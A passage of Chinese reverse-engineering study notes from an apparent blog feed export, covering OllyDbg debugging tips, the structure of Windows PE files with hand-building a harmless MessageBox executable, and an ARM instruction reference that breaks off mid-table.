    <title>逆向（调试）学习笔记(0X02)</title>
    <url>/%E9%80%86%E5%90%91-%E8%B0%83%E8%AF%95-%E7%AC%94%E8%AE%B0_0x02/</url>
    <content><![CDATA[<h1 id="动态分析技术（1）"><a href="#动态分析技术（1）" class="headerlink" title="动态分析技术（1）"></a>动态分析技术（1）</h1><h2 id="OllyDbg调试器"><a href="#OllyDbg调试器" class="headerlink" title="OllyDbg调试器"></a>OllyDbg调试器</h2><h3 id="Hit-Trace"><a href="#Hit-Trace" class="headerlink" title="Hit Trace"></a>Hit Trace</h3><blockquote>
<p>Hit Trace能够让调试者辨别哪一部分代码被执行了、哪一部分没有。使用Hit Trace时，不能再数据中设置断点，否则可能会使程序崩溃。</p>
<p><strong>使用条件</strong>：当遇到一段跳转分支较多的代码，需要了解程序的直行线路时。</p>
<p><strong>使用流程</strong>：单机右键的Hit Trace  –&gt;  Add selection命令  –&gt;  选中要监视的代码  –&gt;  F9运行</p>
</blockquote>
<h3 id="调试符号"><a href="#调试符号" class="headerlink" title="调试符号"></a>调试符号</h3><h4 id="符号格式"><a href="#符号格式" class="headerlink" title="符号格式"></a>符号格式</h4><ul>
<li><p>DBG格式</p>
<blockquote>
<p>DBG是系统调试符，有了调试符系统才能显示出系统函数名。DBG文件基本是一个包含其他调试符的文件，微软将操作系统调试符分配在DBG文件中。</p>
</blockquote>
</li>
<li><p>MAP文件</p>
<blockquote>
<p>MAP文件是程序的全局符号、源文件、代码行号信息的文艺问呗表示方法。MAP文件在任何地方、任何时候都可以使用，不需要程序支持，通用性极好。</p>
</blockquote>
</li>
</ul>
<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ol>
<li><p>快速回到当前程序领域空间</p>
<p> <em>快速回到CPU所在的指令处，双击寄存器面板中的<code>EIP</code>或者单机<code>C</code>按钮</em>。</p>
</li>
<li><p>修改EIP</p>
<p> 将光标移动到要修改的地址上，右键，<code>New Origin Here</code>或快捷键<code>Ctrl+※</code></p>
</li>
<li><p>已删除断点，重新加载时再次出现</p>
<p> <em>将OllyDbg.ini中的相应内容改为 <code>Backup UDD files=1</code>即可解决</em></p>
</li>
</ol>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《加密与解密（第4版）》；</em></strong></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向（调试）</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向（调试）学习笔记(0X03)</title>
    <url>/%E9%80%86%E5%90%91-%E8%B0%83%E8%AF%95-%E7%AC%94%E8%AE%B0_0x03/</url>
    <content><![CDATA[<h1 id="动态分析技术（2）"><a href="#动态分析技术（2）" class="headerlink" title="动态分析技术（2）"></a>动态分析技术（2）</h1><h2 id="常用PE工具"><a href="#常用PE工具" class="headerlink" title="常用PE工具"></a>常用PE工具</h2><p>PE文件格式是Windows操作系统下可执行文件的标准格式，可执行文件的装载、内存分布、执行等都依赖于PE文件格式</p>
<h3 id="PE工具"><a href="#PE工具" class="headerlink" title="PE工具"></a>PE工具</h3><ul>
<li>PE文件格式查看（解析）工具</li>
<li>PE文件格式编辑工具</li>
<li>PE文件格式修改工具</li>
<li>……</li>
</ul>
<h3 id="Stud-PE介绍"><a href="#Stud-PE介绍" class="headerlink" title="Stud_PE介绍"></a>Stud_PE介绍</h3><p>Stud_PE是PE文件格式查看（解析）工具</p>
<p>Stud_PE主要的解析功能在选项卡中，即上方的tools项。主要包含PE头部、数据目录、DOS头、节表信息等。</p>
<h2 id="PE文件格式详解"><a href="#PE文件格式详解" class="headerlink" title="PE文件格式详解"></a>PE文件格式详解</h2><h3 id="PE文件结构全貌介绍"><a href="#PE文件结构全貌介绍" class="headerlink" title="PE文件结构全貌介绍"></a>PE文件结构全貌介绍</h3><p>PE，即可移植的执行体。在Windows平台下，所有的可执行文件均使用PE文件结构，也称它们位PE文件。</p>
<p>PE结构包含的结构体有DOS头、PE标识、文件头、可选头、目录结构、节表等。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/13/MoTLfxlZDHcBQGt.png" alt="PE文件格式"></p>
<p>从数据管理的角度看，可分为两个部分：</p>
<ul>
<li>DOS头、PE头和节表属于构成可执行文件的<strong>数据管理结构</strong>或<strong>数据组织结构部分</strong></li>
<li><strong>节表数据</strong>才是文件真正的数据部分，包含着真正的数据、资源、代码等内容</li>
</ul>
<blockquote>
<p><strong>PE结构各部分简介:</strong></p>
<ol>
<li><p>DOS头</p>
<p> DOS头分为两部分，分别是“<strong>MZ头部</strong>和<strong>DOS存根</strong>”。</p>
<p> MZ头部用于程序在DOS系统下加载。</p>
<p> DOS存根是一段简单的DOS程序</p>
<p> DOS头部的存在是为了执行程序可以兼容DOS系统。</p>
</li>
<li><p>PE头</p>
<p> PE头保存着Windows加载可执行文件的重要信息</p>
<p> PE头在PE文件中的位置是<strong>固定不变</strong>的，PE头部的位置由DOS头部的某个字段给出。</p>
</li>
<li><p>节表</p>
<p> 节表中描述了各个节在<strong>整个文件中</strong>的的位置与<strong>加载入内存后</strong>的位置</p>
</li>
<li><p>节数据</p>
<p> 真正程序代码、数据、资源。</p>
</li>
</ol>
</blockquote>
<h3 id="详解PE文件结构"><a href="#详解PE文件结构" class="headerlink" title="详解PE文件结构"></a>详解PE文件结构</h3><p>PE头分为32位和64位版本。64位的PE结构是对32位PE结构的扩展。</p>
<h4 id="DOS头部详解-IMAGE-DOS-HEADER"><a href="#DOS头部详解-IMAGE-DOS-HEADER" class="headerlink" title="DOS头部详解(IMAGE_DOS_HEADER)"></a><strong>DOS头部详解(IMAGE_DOS_HEADER)</strong></h4><p>对于一个PE文件来说，最开始的位置就是一个DOS程序。</p>
<p>DOS程序包含DOS头部和DOS程序体，DOS头部就是用来装载DOS程序的。</p>
<blockquote>
<p><strong>在Windows下只要一个文件是PE文件，那么开头两个字肯定是4D 5A</strong></p>
</blockquote>
<h4 id="PE头部详解-IMAGE-NT-HEADERS"><a href="#PE头部详解-IMAGE-NT-HEADERS" class="headerlink" title="PE头部详解(IMAGE_NT_HEADERS)"></a><strong>PE头部详解(IMAGE_NT_HEADERS)</strong></h4><p>PE头部是真正用来装载Windows程序的头部</p>
<p>标识该文件是否是PE文件的标识符为“<code>50 45 00 00</code>”。</p>
<p>在判断一个文件是否为PE文件时，首先判断其实位置是否为MZ(<code>4D 5A</code>)</p>
<h4 id="文件头部详解-IMAGE-FILE-HEADER"><a href="#文件头部详解-IMAGE-FILE-HEADER" class="headerlink" title="文件头部详解(IMAGE_FILE_HEADER)"></a><strong>文件头部详解(IMAGE_FILE_HEADER)</strong></h4><p>IMAGE_FILE_HEADER结构体的大小为20字节，起始位置为<code>0x000000E4</code>，结束位置为<code>0x000000F7</code>。</p>
<p>文件头部的其实位置取决于PE头部的其实位置。</p>
<h4 id="可选头详解-IMAGE-OPTIONAL-HEADER"><a href="#可选头详解-IMAGE-OPTIONAL-HEADER" class="headerlink" title="可选头详解(IMAGE_OPTIONAL_HEADER)"></a><strong>可选头详解(IMAGE_OPTIONAL_HEADER)</strong></h4><p>虽然被称为可选头，但并不是一个可选的头部，而是<strong>必须存在的</strong></p>
<p>可选头紧挨文件头，文件头结束位置为<code>0x000000F7</code>，那么可选头其实位置就为<code>0x000000F8</code>，可选头的大小为<code>0x00E0</code>字节（十进制为224字节），结束位置为<code>0x000000F8+0x00E0-1=0x000001D7</code></p>
<h4 id="节表详解-IMAGE-SECTION-HEADER"><a href="#节表详解-IMAGE-SECTION-HEADER" class="headerlink" title="节表详解(IMAGE_SECTION_HEADER)"></a><strong>节表详解(IMAGE_SECTION_HEADER)</strong></h4><p>节表的位置在可选头后边，节表中的每个 IMAGE_SECTION_HEADER 中都存放着可执行文件被映射到内存中所在位置的信息。</p>
<h3 id="PE结构的三种地址"><a href="#PE结构的三种地址" class="headerlink" title="PE结构的三种地址"></a>PE结构的三种地址</h3><p>与PE结构相关的地址有<strong>VA</strong>（虚拟地址）、<strong>RVA</strong>（相对虚拟地址）和 FOA（文件 偏移地址）3 种形式。</p>
<blockquote>
<ol>
<li>VA（虚拟地址）：PE 文件被Windows 加载到内存后的地址。</li>
<li>RVA（相对虚拟地址）：PE 文件<strong>虚拟地址</strong>相对于 <strong>映射基</strong> 地址的 <strong>偏移地址</strong>。</li>
<li>FOA（文件偏移地址）：相对于 PE 文件在磁盘上文件开头的偏移地址。</li>
</ol>
</blockquote>
<h3 id="三种地址的转换"><a href="#三种地址的转换" class="headerlink" title="三种地址的转换"></a>三种地址的转换</h3><p>计算公式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">某数据的FOA &#x3D; 该数据的RVA - （该数据所在节的起始RVA - 该数据所在节的起始FOA）</span><br></pre></td></tr></table></figure>
<p>RVA 与 FOA <strong>不同的原因是由于节的起始位置的不同而导致的</strong></p>
<p>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《加密与解密（第4版）》；</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向（调试）</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向（调试）学习笔记(0X04)</title>
    <url>/%E9%80%86%E5%90%91-%E8%B0%83%E8%AF%95-%E7%AC%94%E8%AE%B0_0x04/</url>
    <content><![CDATA[<h2 id="手写PE文件"><a href="#手写PE文件" class="headerlink" title="手写PE文件"></a>手写PE文件</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>将要完成的功能：</p>
<ul>
<li>弹出一个有”确定“按钮的对话框</li>
<li>提示对话框上显示“Hello,PE File!”</li>
<li>单机确定按钮后退出</li>
</ul>
<blockquote>
<p>弹出提示对话框的API函数是<code>MessageBox</code>，进程退出使用的是<code>ExitProcess</code>函数。</p>
<p><em><code>MessageBox</code> 函数是系统中 user32.dll 导出的一个函数，<code>ExitProcess</code> 函数是系统中 kernel32.dll 中导出的一个函数。</em></p>
</blockquote>
<p>PE文件规划</p>
<blockquote>
<ul>
<li>DOS头</li>
<li>PE标识符(PE\0\0)</li>
<li>文件头</li>
<li>可选头</li>
<li>节表</li>
<li>节（代码节、数据节、导入表节）</li>
</ul>
</blockquote>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/W2dY4JcQXysLMoq.png"></p>
<p>各个节的作用</p>
<ul>
<li>代码节中存放<code>MessageBox</code>函数和<code>ExitProcess</code>函数的代码。</li>
<li>数据节中存放调用 <code>Message Box</code>函数时，在提示框中显示的内容，即存放的是字<br>  符串的数据。</li>
<li>导入表节中存放 <code>MessageBox</code> 函数和 <code>ExitProcess</code> 函数的导入函数信息。</li>
</ul>
<h3 id="用十六进制字节完成PE文件"><a href="#用十六进制字节完成PE文件" class="headerlink" title="用十六进制字节完成PE文件"></a>用十六进制字节完成PE文件</h3><p>构造PE文件的顺序是将结构逐一构造，就是先构造DOS头、PE标识等，最后完成PE文件的代码</p>
<p><strong>创建文件的步骤</strong></p>
<blockquote>
<p>C32Asm编辑器  —&gt;  文件  —&gt;  新建16进制文件  —&gt;  文件大小填写64</p>
<p>在DOS头结构体中，最后死歌字节是指向PE标识符的便宜</p>
</blockquote>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/DZWf1Icy3dQSVoz.png"></p>
<p><strong>构造PE标识符</strong></p>
<p>构造完DOS头后，紧接着构造PE标识符，PE标识符站四个字节，因此在C32Asm增减四个字节的位置</p>
<blockquote>
<p>菜单  —&gt;  编辑  —&gt;  插入数据  —&gt;  插入数据大小  —&gt;  填写“4”</p>
<p>将前两个字节填写为50 45</p>
</blockquote>
<p><strong>构造文件头(IMAGE_FILE_HEADER)结构</strong></p>
<blockquote>
<p>该文件体大小为14H字节（十进制为20字节），在C32Asm中插入20字节数据，修改填充表如图所示</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/lOgkZxP5TsUBqCr.png"></p>
<p>填充后的数据如下图所示：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/JCYkBw5iPHGcxRd.png"></p>
</blockquote>
<p><strong>构造可选头(IMAGE_OPTIONAL_HEADER)结构</strong></p>
<p>该结构体分为32位和64位，本次使用32位</p>
<p>该结构体大小为0E0h字节（转换为十进制为224字节），在C32Asm填充224字节的数据。</p>
<p>填充后数据如下图：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/mGwaRLF8NDoUlZb.png"></p>
<p>填充完基础数据部分后，需要填写数据目录部分，由于手动完成的是一个EXE文件，因此数据目录中只需要存在两项：</p>
<ul>
<li>第一个数据目录项（导入表）</li>
<li>第十三个数据目录项（导入地址表）</li>
</ul>
<p>导入地址表后放入导入表，导入地址表占用16个字节</p>
<p><strong>构造节表(IMAGE_SECTION_HEADER)结构</strong></p>
<p>节表中一共包含三个节表项，也就是需要构造三个IMAGE_SECTION_HEADER结构体</p>
<p>IMAGE_SECTION_HEADER结构体的大小是40个字节，由于需要构造3个，所以占用120字节</p>
<p>填充完成后如下图所示：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/WEt6OHvN2rGLld5.png"></p>
<p><strong>0数据的填充</strong></p>
<p>在 IMAGE_OPTIONAL_HEADER结构体中 的 <code>SizeOfHeader</code> 字段的值是 0x00001000。因此，为了按照对齐粒度需要将头部的大小用 0<br>字节补足，头部文件当前位432字节，最后一位地址为<code>000001B0</code>，用0x1000-0x01B0=0x0E50，转换为10进制数为3664，所以还需填充3664位。</p>
<p>在填充完 PE 文件头部后，需要继续填充 0x00001000 字节的 0 字符，该 0x00001000 字 节的数据用来存放.text 节的内容，即代码节的内容</p>
<p>继续使用 C32Asm 插入 4096 个 0 字符。 由于代码节是最后完成的部分，因此这里只是先对其填充 0 字符。</p>
<p><strong>填充.data节的数据</strong></p>
<p>.data 节是用来保存程序在运行时弹出提示对话框时，对话框上显示的字符串。提示对 话框使用的是 MessageBox 函数来完成</p>
<p>本例中<code>MessageBox</code> 函数的第二个参数和第三个参数分别是两个字符串，第二个参数 <code>lpText</code> 是 提示对话框中用于显示的字符串，第三个参数l<code>pCaption</code>是提示对话框中标题显示的字符串。 在本例子中，<code>lpText</code> 显示的字符串是“<code>Hello, Pe Binary Diy!</code>!”,<code>lpCaption</code>显示的字符串是<br>“<code>Binary Diy</code>”。</p>
<p>在 0x00002000 的地址处写入 <code>lpText</code> 的值，在 0x00002020 的地址处写入 <code>lpCaption</code> 的值，如下图所示：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/Ii4y8lwXeC7czrb.png"></p>
<p><strong>插入.idata节的数据</strong></p>
<p>.idata 节用来保存 PE 文件中重要的两个部分，分别是导入表和导入地址表</p>
<p>导入表和导入地址表的地址分别是由数据目录给出的。导入地址表的偏移地址在 0x00003000，而导入表的偏移地址在 0x00003010 处。</p>
<p>在文件偏移地址为 0x00003010 处进行构造占位用的导入表，导入后结果如下图</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/JlkQZd9xaVuWger.png"></p>
<blockquote>
<p>在该实例中导入了两个 DLL 文件，分别是 user32.dll 和 kernel32.dll。在 user32.dll 中调用 了 MessageBoxA 函数，在 kernel32.dll 中调用了 ExitProcess 函数。</p>
</blockquote>
<p>构造 user32.dll 的导入信息，按照 IMAGE_IMPORT_DESCRIPTOR 结构体来进行构造。</p>
<blockquote>
<ol>
<li>在0x00003050 地址处构造导入表的 <code>Name</code> 字段的值“user32.dll”。 </li>
<li>在 0x00003060 地址处构造导入表的 <code>OriginalFirstThunk</code> 字段的值“0x00003070”。</li>
<li>在 0x00003070 地址处根据 IMAGE_IMPORT_BY_NAME 结构体构造导入函数的 名称。</li>
<li>在 0x00003000 地址处是导入地址表，该值由 FirstThunk 来指向，该值在磁盘上时与 OriginalFirstThunk 相同。因此，在文件偏移地址 0x00003000 处填入 0x00003070。</li>
</ol>
</blockquote>
<p>构造后如下图所示：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/IPinDAu8yVtEWMj.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/PIBfloMe1ki23wG.png"></p>
<p>根据表5-6重新导入数据，得到下图：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/15/WE8BqtjUX76JmYH.png"></p>
<p><strong>填充.text节的数据</strong></p>
<p>在OD中对数据进行查看后，得到如下的结果： </p>
<ul>
<li><p>.<code>text</code> 节的位置从 0x00401000 处开始； </p>
</li>
<li><p>“<code>Hello,PE Binary Diy</code>!!”字符串的地址在 0x00402000 处；</p>
</li>
<li><p>“<code>Binary Diy</code>”字符串的地址在 0x00402020 处； </p>
</li>
<li><p>“<code>MessageBoxA</code>”函数的导入地址在 0x403000 处；</p>
</li>
<li><p>“<code>ExitProcess</code>”函数的导入地址在 0x403008 处。</p>
</li>
</ul>
<p>选中录入的反汇编代码，单击鼠标右键，在弹出的菜单中选择“复制到可执行文件”→ “选择”，在弹出的“文件”窗口中单击鼠标右键，在弹出的菜单中选择“保存文件”，将文件<br>命名为“pe1.exe”进行保存。</p>
<p><strong>至此一个可执行文件就构造完成了</strong></p>
<p><u><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《加密与解密（第4版）》；</em></u></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向（调试）</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM汇编指令集</title>
    <url>/ARM%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>ADC</th>
<th>带进位的32位数加法</th>
</tr>
</thead>
<tbody><tr>
<td>ADD</td>
<td>32位数相加</td>
</tr>
<tr>
<td>AND</td>
<td>32位数的逻辑与</td>
</tr>
<tr>
<td>B</td>
<td>在32M空间内的相对跳转指令</td>
</tr>
<tr>
<td>BEQ</td>
<td>相等则跳转（Branch if EQual）</td>
</tr>
<tr>
<td>BNE</td>
<td>不相等则跳转（Branch if Not Equal）</td>
</tr>
<tr>
<td>BGE</td>
<td>大于或等于跳转（Branch if Greater than or Equa）</td>
</tr>
<tr>
<td>BGT</td>
<td>大于跳转（Branch if Greater Than）</td>
</tr>
<tr>
<td>BIC</td>
<td>32位数的逻辑位清零</td>
</tr>
<tr>
<td>BKPT</td>
<td>断点指令</td>
</tr>
<tr>
<td>BL</td>
<td>带链接的相对跳转指令</td>
</tr>
<tr>
<td>BLE</td>
<td>小于或等于跳转（Branch if Less than or Equal）</td>
</tr>
<tr>
<td>BLEQ</td>
<td>带链接等于跳转（Branch with Link if EQual）</td>
</tr>
<tr>
<td>BLLT</td>
<td>带链接小于跳转（Branch with Link if Less Than）</td>
</tr>
<tr>
<td>BLT</td>
<td>小于跳转（Branch if Less Than）</td>
</tr>
<tr>
<td>BLX</td>
<td>带链接的切换跳转</td>
</tr>
<tr>
<td>BX</td>
<td>切换跳转</td>
</tr>
<tr>
<td>CDP CDP2</td>
<td>协处理器数据处理操作</td>
</tr>
<tr>
<td>CLZ</td>
<td>零计数</td>
</tr>
<tr>
<td>CMN</td>
<td>比较两个数的相反数</td>
</tr>
<tr>
<td>CMP</td>
<td>32位数比较</td>
</tr>
<tr>
<td>EOR</td>
<td>32位逻辑异或</td>
</tr>
<tr>
<td>LDC LDC2</td>
<td>从协处理器取一个或多个32位值</td>
</tr>
<tr>
<td>LDM</td>
<td>从内存送多个32位字到ARM寄存器</td>
</tr>
<tr>
<td>LDR</td>
<td>从虚拟地址取一个单个的32位值</td>
</tr>
<tr>
<td>MCR MCR2 MCRR</td>
<td>从寄存器送数据到协处理器</td>
</tr>
<tr>
<td>MLA</td>
<td>32位乘累加</td>
</tr>
<tr>
<td>MOV</td>
<td>传送一个32位数到寄存器</td>
</tr>
<tr>
<td>MRC MRC2 MRRC</td>
<td>从协处理器传送数据到寄存器</td>
</tr>
<tr>
<td>MRS</td>
<td>把状态寄存器的值送到通用寄存器</td>
</tr>
<tr>
<td>MSR</td>
<td>把通用寄存器的值传送到状态寄存器</td>
</tr>
<tr>
<td>MUL</td>
<td>32位乘</td>
</tr>
<tr>
<td>MVN</td>
<td>把一个32位数的逻辑“非”送到寄存器</td>
</tr>
<tr>
<td>ORR</td>
<td>32位逻辑或</td>
</tr>
<tr>
<td>PLD</td>
<td>预装载提示指令</td>
</tr>
<tr>
<td>QADD</td>
<td>有符号32位饱和加</td>
</tr>
<tr>
<td>QDADD</td>
<td>有符号双32位饱和加</td>
</tr>
<tr>
<td>QSUB</td>
<td>有符号32位饱和减</td>
</tr>
<tr>
<td>QDSUB</td>
<td>有符号双32位饱和减</td>
</tr>
<tr>
<td>RSB</td>
<td>逆向32位减法</td>
</tr>
<tr>
<td>RSC</td>
<td>带进位的逆向32法减法</td>
</tr>
<tr>
<td>SBC</td>
<td>带进位的32位减法</td>
</tr>
<tr>
<td>SMLAxy</td>
<td>有符号乘累加(16位*16位)+32位=32位</td>
</tr>
<tr>
<td>SMLAL</td>
<td>64位有符号乘累加((32位*32位)+64位=64位)</td>
</tr>
<tr>
<td>SMALxy</td>
<td>64位有符号乘累加((32位*32位)+64位=64位)</td>
</tr>
<tr>
<td>SMLAWy</td>
<td>号乘累加((32位*16位)&gt;&gt;16位)+32位=32位</td>
</tr>
<tr>
<td>SMULL</td>
<td>64位有符号乘累加(32位*32位)=64位</td>
</tr>
<tr>
<td>SMULxy</td>
<td>有符号乘(16位*16位=32位)</td>
</tr>
<tr>
<td>SMULWy</td>
<td>有符号乘(32位*16位&gt;&gt;16位=32位)</td>
</tr>
<tr>
<td>STC STC2</td>
<td>从协处理器中把一个或多个32位值存到内存</td>
</tr>
<tr>
<td>STM</td>
<td>把多个32位的寄存器值存放到内存</td>
</tr>
<tr>
<td>STR</td>
<td>把寄存器的值存到一个内存的虚地址内间</td>
</tr>
<tr>
<td>SUB</td>
<td>32位减法</td>
</tr>
<tr>
<td>SWI</td>
<td>软中断</td>
</tr>
<tr>
<td>SWP</td>
<td>把一个字或者一个字节和一个寄存器值交换</td>
</tr>
<tr>
<td>TEQ</td>
<td>等值测试</td>
</tr>
<tr>
<td>TST</td>
<td>位测试</td>
</tr>
<tr>
<td>UMLAL</td>
<td>64位无符号乘累加((32位*32位)+64位=64位)</td>
</tr>
<tr>
<td>UMULL</td>
<td>64位无符号乘累加(32位*32位)=64位</td>
</tr>
</tbody></table>
<h2 id="分类详解"><a href="#分类详解" class="headerlink" title="分类详解"></a>分类详解</h2><p><a href="javascript:;">编辑</a></p>
<h3 id="算术和逻辑指令"><a href="#算术和逻辑指令" class="headerlink" title="算术和逻辑指令"></a>算术和逻辑指令</h3><p><strong>ADC(Addition with Carry)</strong> : 带进位的加法。</p>
<p><strong>定义：</strong>ADC是将把两个操作数加起来，并把结果放置到目的寄存器中。它使用一个进位标志位，这样就 可以做比 32 位大的加法。</p>
<p><strong>代码：</strong>ADC{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_1 + op_2 + carry</p>
<p><strong>实例：</strong></p>
<p>下列例子将加两个 128 位的数。</p>
<p>128 位结果: 寄存器 0、1、2、和 3</p>
<p>第一个 128 位数: 寄存器 4、5、6、和 7</p>
<p>第二个 128 位数: 寄存器 8、9、10、和 11。</p>
<p>ADDS R0, R4, R8 ; 加低端的字</p>
<p>ADCS R1, R5, R9 ; 加下一个字，带进位</p>
<p>ADCS R2, R6, R10 ; 加第三个字，带进位</p>
<p>ADCS R3, R7, R11 ; 加高端的字，带进位</p>
<p><strong>注意：</strong> 如果如果要做这样的加法，不要忘记设置 S 后缀来更改进位标志。</p>
<p><strong>ADD(Addition) :</strong> 加法。</p>
<p><strong>定义：</strong>ADD 是将把两个操作数加起来，把结果放置到目的寄存器中。</p>
<p>操作数1：是一个寄存器。</p>
<p>操作数2：可以是一个寄存器，被移位的寄存器，或一个立即值。</p>
<p><strong>代码：</strong>ADD{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_1 + op_2</p>
<p><strong>实例：</strong></p>
<p>ADD R0, R1, R2 ; R0 = R1 + R2</p>
<p>ADD R0, R1, #256 ; R0 = R1 + 256</p>
<p>ADD R0, R2, R3,LSL#1 ; R0 = R2 + (R3 &lt;&lt; 1)</p>
<p><strong>注意：</strong>加法可以在有符号和无符号数上进行。</p>
<p><strong>AND (logical AND):</strong> 逻辑与。</p>
<p><strong>定义：</strong>AND 将在两个操作数上进行逻辑与，把结果放置到目的寄存器中；对屏蔽你要在上面工作的位很 有用。</p>
<p>操作数1：是一个寄存器。</p>
<p>操作数2：可以是一个寄存器，被移位的寄存器，或一个立即值。</p>
<p><strong>代码：</strong>AND{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_1 AND op_2</p>
<p><strong>实例：</strong>AND R0, R0, #3 ; R0 = 保持 R0 的位 0 和 1，丢弃其余的位。</p>
<p><strong>真值表</strong>(二者都是 1 则结果为 1)</p>
<table>
<thead>
<tr>
<th>op_1</th>
<th>op_2</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody></table>
<p><strong>BIC(Bit Clear) :</strong> 位清除。</p>
<p>BIC 是在一个字中清除位的一种方法，与 OR 位设置是相反的操作。操作数 2 是一个 32 位位掩码(mask)。如果如果在掩码中设置了某一位，则清除这一位。未设置的掩码位指示此位保持不变。</p>
<p>BIC{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_1 AND (!op_2)</p>
<p>BIC R0, R0, #%1011 ; 清除 R0 中的位 0、1、和 3。保持其余的不变</p>
<p>BIC 真值表 :</p>
<table>
<thead>
<tr>
<th>Op_1</th>
<th>Op_2</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
</tbody></table>
<p>译注：逻辑表达式为 Op_1 AND NOT Op_2</p>
<p><strong>EOR : 逻辑异或</strong></p>
<p><strong>(logical Exclusive OR)</strong></p>
<p>EOR 将在两个操作数上进行逻辑异或，把结果放置到目的寄存器中；对反转特定的位有用。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值</p>
<p>EOR{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_1 EOR op_2</p>
<p>EOR R0, R0, #3 ; 反转 R0 中的位 0 和 1</p>
<p>EOR 真值表(二者不同则结果为 1):</p>
<table>
<thead>
<tr>
<th>Op_1</th>
<th>Op_2</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
</tbody></table>
<p><strong>MOV : 传送</strong></p>
<p><strong>(Move)</strong></p>
<p>MOV 从另一个寄存器、被移位的寄存器、或一个立即值装载一个值到目的寄存器。你可以指定相同的寄存器来实现 NOP 指令的效果，你还可以专门移位一个寄存器</p>
<p>MOV{条件}{S} <dest>, &lt;op 1&gt;</p>
<p>dest = op_1</p>
<p>MOV R0, R0 ; R0 = R0… NOP 指令</p>
<p>MOV R0, R0, LSL#3 ; R0 = R0 * 8</p>
<p>如果 R15 是目的寄存器，将修改程序计数器或标志。这用于返回到调用代码，方法是把连接寄存器的内容传送到 R15:</p>
<p>MOV PC, R14 ; 退出到调用者</p>
<p>MOVS PC, R14 ; 退出到调用者并恢复标志位</p>
<p>(不遵从 32-bit 体系)</p>
<p><strong>MVN : 传送取反的值</strong></p>
<p><strong>(MoveNegative)</strong></p>
<p>MVN 从另一个寄存器、被移位的寄存器、或一个立即值装载一个值到目的寄存器。不同之处是在传送之前位被反转了，所以把一个被取反的值传送到一个寄存器中。这是逻辑非操作而不是算术操作，这个取反的值加 1 才是它的取负的值</p>
<p>MVN{条件}{S} <dest>, &lt;op 1&gt;</p>
<p>dest = !op_1</p>
<p>MVN R0, #4 ; R0 = -5</p>
<p>MVN R0, #0 ; R0 = -1</p>
<p><strong>ORR : 逻辑或</strong></p>
<p><strong>(logical OR)</strong></p>
<p>ORR指令用于在两个操作数上进行逻辑或运算，并把结果放置到目的寄存器中。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。该指令常用于设置操作数1的某些位。 [1]  </p>
<p>op2可以是寄存器、被移位的寄存器或立即数。一般用于设置Rn的特定几位。 [2] </p>
<p>ORR{条件}{S} <dest>, &lt;op 1&gt;, &lt;op 2&gt;</p>
<p>dest = op_1 OR op_2</p>
<p>ORR R0, R0, #3 ;  该指令设置R0的0、1位，其余位保持不变。 [1] </p>
<p>ORR R0,R0,#5 ;R0的第0位和第2位设置为1，其余位不变 [2] </p>
<p>OR 真值表(二者中存在 1 则结果为 1):</p>
<table>
<thead>
<tr>
<th>Op_1</th>
<th>Op_2</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
